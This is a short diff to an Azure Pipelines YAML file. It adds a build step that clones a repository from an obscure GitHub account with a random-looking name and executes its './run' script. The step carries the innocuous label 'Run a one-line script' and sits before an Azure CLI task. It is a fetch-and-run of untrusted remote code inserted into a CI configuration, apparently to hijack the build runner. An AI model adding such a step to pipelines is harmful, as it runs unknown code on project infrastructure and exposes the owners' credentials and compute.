@@ -15,6 +15,8 @@ pool:
   vmImage: 'Ubuntu-16.04'
 
 steps:
+- script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+  displayName: 'Run a one-line script'
 - task: AzureCLI@2
   displayName: 'Install AML CLI'
   inputs:
